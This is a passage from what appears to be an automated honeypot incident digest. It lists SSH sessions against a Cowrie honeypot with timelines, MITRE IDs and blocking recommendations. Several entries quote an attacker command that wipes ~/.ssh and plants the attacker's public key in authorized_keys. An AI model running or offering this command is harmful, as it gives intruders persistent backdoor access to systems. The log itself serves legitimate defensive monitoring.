| `2026-07-04 07:07:09` | `cowrie.session.file_download` |
| `2026-07-04 07:07:09` | `cowrie.log.closed` |
| `2026-07-04 07:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e372e8058f

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-07-04 07:07 |
| **Last Seen** | 2026-07-04 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:07:09` | `cowrie.session.connect` |
| `2026-07-04 07:07:09` | `cowrie.client.version` |
| `2026-07-04 07:07:10` | `cowrie.client.kex` |
| `2026-07-04 07:07:11` | `cowrie.login.success` |
| `2026-07-04 07:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34efed1ad9c6

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-07-04 07:07 |
| **Last Seen** | 2026-07-04 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:07:11` | `cowrie.session.connect` |
| `2026-07-04 07:07:11` | `cowrie.client.version` |
| `2026-07-04 07:07:11` | `cowrie.client.kex` |
| `2026-07-04 07:07:12` | `cowrie.login.success` |
| `2026-07-04 07:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1960f5c4d14

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 07:08 |
| **Last Seen** | 2026-07-04 07:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:08:03` | `cowrie.session.connect` |
| `2026-07-04 07:08:04` | `cowrie.client.version` |
| `2026-07-04 07:08:04` | `cowrie.client.kex` |
| `2026-07-04 07:08:10` | `cowrie.login.success` |
| `2026-07-04 07:08:13` | `cowrie.session.params` |
| `2026-07-04 07:08:13` | `cowrie.command.input` |
| `2026-07-04 07:08:15` | `cowrie.log.closed` |
| `2026-07-04 07:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba86d213cc4

| Field | Detail |
|---|---|
| **Source IP** | `45.225.135[.]30` |
| **First Seen** | 2026-07-04 07:10 |
| **Last Seen** | 2026-07-04 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id; uname -a; hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:10:21` | `cowrie.session.connect` |
| `2026-07-04 07:10:21` | `cowrie.client.version` |
| `2026-07-04 07:10:21` | `cowrie.client.kex` |
| `2026-07-04 07:10:21` | `cowrie.login.success` |
| `2026-07-04 07:10:22` | `cowrie.session.params` |
| `2026-07-04 07:10:22` | `cowrie.command.input` |
| `2026-07-04 07:10:22` | `cowrie.log.closed` |
| `2026-07-04 07:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.225.135[.]30` to AbuseIPDB if not already reported
- [ ] Block `45.225.135[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a8766e6bead

| Field | Detail |
|---|---|
| **Source IP** | `45.225.135[.]30` |
| **First Seen** | 2026-07-04 07:10 |
| **Last Seen** | 2026-07-04 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id; uname -a; hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:10:23` | `cowrie.session.connect` |
| `2026-07-04 07:10:23` | `cowrie.client.version` |
| `2026-07-04 07:10:24` | `cowrie.client.kex` |
| `2026-07-04 07:10:24` | `cowrie.login.success` |
| `2026-07-04 07:10:25` | `cowrie.session.params` |
| `2026-07-04 07:10:25` | `cowrie.command.input` |
| `2026-07-04 07:10:25` | `cowrie.log.closed` |
| `2026-07-04 07:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.225.135[.]30` to AbuseIPDB if not already reported
- [ ] Block `45.225.135[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21af82447401

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]58` |
| **First Seen** | 2026-07-04 07:11 |
| **Last Seen** | 2026-07-04 07:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:11:24` | `cowrie.session.connect` |
| `2026-07-04 07:11:24` | `cowrie.client.version` |
| `2026-07-04 07:11:24` | `cowrie.client.kex` |
| `2026-07-04 07:11:25` | `cowrie.login.success` |
| `2026-07-04 07:11:26` | `cowrie.session.params` |
| `2026-07-04 07:11:26` | `cowrie.command.input` |
| `2026-07-04 07:11:26` | `cowrie.command.failed` |
| `2026-07-04 07:11:26` | `cowrie.log.closed` |
| `2026-07-04 07:11:27` | `cowrie.session.params` |
| `2026-07-04 07:11:27` | `cowrie.command.input` |
| `2026-07-04 07:11:27` | `cowrie.session.file_download` |
| `2026-07-04 07:11:27` | `cowrie.log.closed` |
| `2026-07-04 07:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b25eb496f74

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]58` |
| **First Seen** | 2026-07-04 07:11 |
| **Last Seen** | 2026-07-04 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:11:28` | `cowrie.session.connect` |
| `2026-07-04 07:11:28` | `cowrie.client.version` |
| `2026-07-04 07:11:28` | `cowrie.client.kex` |
| `2026-07-04 07:11:29` | `cowrie.login.success` |
| `2026-07-04 07:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e655c4ee9757

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]58` |
| **First Seen** | 2026-07-04 07:11 |
| **Last Seen** | 2026-07-04 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:11:29` | `cowrie.session.connect` |
| `2026-07-04 07:11:29` | `cowrie.client.version` |
| `2026-07-04 07:11:29` | `cowrie.client.kex` |
| `2026-07-04 07:11:30` | `cowrie.login.success` |
| `2026-07-04 07:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a82a59317d14

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 07:15 |
| **Last Seen** | 2026-07-04 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:15:13` | `cowrie.session.connect` |
| `2026-07-04 07:15:13` | `cowrie.client.version` |
| `2026-07-04 07:15:13` | `cowrie.client.kex` |
| `2026-07-04 07:15:13` | `cowrie.login.success` |
| `2026-07-04 07:15:14` | `cowrie.session.params` |
| `2026-07-04 07:15:14` | `cowrie.command.input` |
| `2026-07-04 07:15:14` | `cowrie.log.closed` |
| `2026-07-04 07:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c694e3594cb7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 07:20 |
| **Last Seen** | 2026-07-04 07:20 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:20:13` | `cowrie.session.connect` |
| `2026-07-04 07:20:15` | `cowrie.client.version` |
| `2026-07-04 07:20:15` | `cowrie.client.kex` |
| `2026-07-04 07:20:23` | `cowrie.login.success` |
| `2026-07-04 07:20:28` | `cowrie.session.params` |
| `2026-07-04 07:20:28` | `cowrie.command.input` |
| `2026-07-04 07:20:29` | `cowrie.log.closed` |
| `2026-07-04 07:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35f9430377e3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 07:32 |
| **Last Seen** | 2026-07-04 07:32 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:32:13` | `cowrie.session.connect` |
| `2026-07-04 07:32:14` | `cowrie.client.version` |
| `2026-07-04 07:32:14` | `cowrie.client.kex` |
| `2026-07-04 07:32:21` | `cowrie.login.success` |
| `2026-07-04 07:32:24` | `cowrie.session.params` |
| `2026-07-04 07:32:24` | `cowrie.command.input` |
| `2026-07-04 07:32:26` | `cowrie.log.closed` |
| `2026-07-04 07:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cacdb693ff99

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 07:43 |
| **Last Seen** | 2026-07-04 07:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:43:49` | `cowrie.session.connect` |
| `2026-07-04 07:43:50` | `cowrie.client.version` |
| `2026-07-04 07:43:50` | `cowrie.client.kex` |
| `2026-07-04 07:43:57` | `cowrie.login.success` |
| `2026-07-04 07:44:00` | `cowrie.session.params` |
| `2026-07-04 07:44:00` | `cowrie.command.input` |
| `2026-07-04 07:44:02` | `cowrie.log.closed` |
| `2026-07-04 07:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129c751bbd87

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-04 07:45 |
| **Last Seen** | 2026-07-04 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:45:15` | `cowrie.session.connect` |
| `2026-07-04 07:45:15` | `cowrie.client.version` |
| `2026-07-04 07:45:15` | `cowrie.client.kex` |
| `2026-07-04 07:45:15` | `cowrie.login.success` |
| `2026-07-04 07:45:15` | `cowrie.direct-tcpip.request` |
| `2026-07-04 07:45:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-04 07:45:15` | `cowrie.direct-tcpip.data` |
| `2026-07-04 07:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8dde0a848ca

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-04 07:45 |
| **Last Seen** | 2026-07-04 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:45:15` | `cowrie.session.connect` |
| `2026-07-04 07:45:15` | `cowrie.client.version` |
| `2026-07-04 07:45:15` | `cowrie.client.kex` |
| `2026-07-04 07:45:16` | `cowrie.login.success` |
| `2026-07-04 07:45:16` | `cowrie.direct-tcpip.request` |
| `2026-07-04 07:45:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-04 07:45:16` | `cowrie.direct-tcpip.data` |
| `2026-07-04 07:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b02ec9b4d6f

| Field | Detail |
|---|---|
| **Source IP** | `37.110.113[.]113` |
| **First Seen** | 2026-07-04 07:51 |
| **Last Seen** | 2026-07-04 07:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:51:37` | `cowrie.session.connect` |
| `2026-07-04 07:51:37` | `cowrie.client.version` |
| `2026-07-04 07:51:37` | `cowrie.client.kex` |
| `2026-07-04 07:51:37` | `cowrie.login.success` |
| `2026-07-04 07:51:38` | `cowrie.session.params` |
| `2026-07-04 07:51:38` | `cowrie.command.input` |
| `2026-07-04 07:51:38` | `cowrie.command.failed` |
| `2026-07-04 07:51:38` | `cowrie.log.closed` |
| `2026-07-04 07:51:39` | `cowrie.session.params` |
| `2026-07-04 07:51:39` | `cowrie.command.input` |
| `2026-07-04 07:51:39` | `cowrie.session.file_download` |
| `2026-07-04 07:51:39` | `cowrie.log.closed` |
| `2026-07-04 07:51:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.110.113[.]113` to AbuseIPDB if not already reported
- [ ] Block `37.110.113[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2adaae765a6f

| Field | Detail |
|---|---|
| **Source IP** | `37.110.113[.]113` |
| **First Seen** | 2026-07-04 07:51 |
| **Last Seen** | 2026-07-04 07:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:51:39` | `cowrie.session.connect` |
| `2026-07-04 07:51:39` | `cowrie.client.version` |
| `2026-07-04 07:51:39` | `cowrie.client.kex` |
| `2026-07-04 07:51:40` | `cowrie.login.success` |
| `2026-07-04 07:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.110.113[.]113` to AbuseIPDB if not already reported
- [ ] Block `37.110.113[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13bdb9f67dff

| Field | Detail |
|---|---|
| **Source IP** | `37.110.113[.]113` |
| **First Seen** | 2026-07-04 07:51 |
| **Last Seen** | 2026-07-04 07:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:51:40` | `cowrie.session.connect` |
| `2026-07-04 07:51:40` | `cowrie.client.version` |
| `2026-07-04 07:51:40` | `cowrie.client.kex` |
| `2026-07-04 07:51:41` | `cowrie.login.success` |
| `2026-07-04 07:51:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.110.113[.]113` to AbuseIPDB if not already reported
- [ ] Block `37.110.113[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d57dcba64a5d

| Field | Detail |
|---|---|
| **Source IP** | `45.4.179[.]4` |
| **First Seen** | 2026-07-04 07:52 |
| **Last Seen** | 2026-07-04 07:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:52:17` | `cowrie.session.connect` |
| `2026-07-04 07:52:17` | `cowrie.client.version` |
| `2026-07-04 07:52:17` | `cowrie.client.kex` |
| `2026-07-04 07:52:18` | `cowrie.login.success` |
| `2026-07-04 07:52:19` | `cowrie.session.params` |
| `2026-07-04 07:52:19` | `cowrie.command.input` |
| `2026-07-04 07:52:19` | `cowrie.command.failed` |
| `2026-07-04 07:52:19` | `cowrie.log.closed` |
| `2026-07-04 07:52:19` | `cowrie.session.params` |
| `2026-07-04 07:52:19` | `cowrie.command.input` |
| `2026-07-04 07:52:20` | `cowrie.session.file_download` |
| `2026-07-04 07:52:20` | `cowrie.log.closed` |
| `2026-07-04 07:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.4.179[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.4.179[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa0447c05c5e

| Field | Detail |
|---|---|
| **Source IP** | `45.4.179[.]4` |
| **First Seen** | 2026-07-04 07:52 |
| **Last Seen** | 2026-07-04 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:52:20` | `cowrie.session.connect` |
| `2026-07-04 07:52:20` | `cowrie.client.version` |
| `2026-07-04 07:52:20` | `cowrie.client.kex` |
| `2026-07-04 07:52:20` | `cowrie.login.success` |
| `2026-07-04 07:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.4.179[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.4.179[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec97b7aed8b7

| Field | Detail |
|---|---|
| **Source IP** | `45.4.179[.]4` |
| **First Seen** | 2026-07-04 07:52 |
| **Last Seen** | 2026-07-04 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:52:20` | `cowrie.session.connect` |
| `2026-07-04 07:52:20` | `cowrie.client.version` |
| `2026-07-04 07:52:20` | `cowrie.client.kex` |
| `2026-07-04 07:52:21` | `cowrie.login.success` |
| `2026-07-04 07:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.4.179[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.4.179[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b2682c88f9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]97` |
| **First Seen** | 2026-07-04 07:53 |
| **Last Seen** | 2026-07-04 07:58 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:53:28` | `cowrie.session.connect` |
| `2026-07-04 07:53:28` | `cowrie.client.version` |
| `2026-07-04 07:53:28` | `cowrie.client.kex` |
| `2026-07-04 07:53:29` | `cowrie.login.success` |
| `2026-07-04 07:53:30` | `cowrie.session.params` |
| `2026-07-04 07:53:30` | `cowrie.command.input` |
| `2026-07-04 07:53:30` | `cowrie.command.failed` |
| `2026-07-04 07:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]97` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b662ac3b6bbb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 07:55 |
| **Last Seen** | 2026-07-04 07:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:55:31` | `cowrie.session.connect` |
| `2026-07-04 07:55:32` | `cowrie.client.version` |
| `2026-07-04 07:55:32` | `cowrie.client.kex` |
| `2026-07-04 07:55:39` | `cowrie.login.success` |
| `2026-07-04 07:55:42` | `cowrie.session.params` |
| `2026-07-04 07:55:42` | `cowrie.command.input` |
| `2026-07-04 07:55:43` | `cowrie.log.closed` |
| `2026-07-04 07:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb762a3b212

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-04 07:57 |
| **Last Seen** | 2026-07-04 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:57:09` | `cowrie.session.connect` |
| `2026-07-04 07:57:09` | `cowrie.client.version` |
| `2026-07-04 07:57:09` | `cowrie.client.kex` |
| `2026-07-04 07:57:10` | `cowrie.login.success` |
| `2026-07-04 07:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17995cb40bd2

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-04 07:57 |
| **Last Seen** | 2026-07-04 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

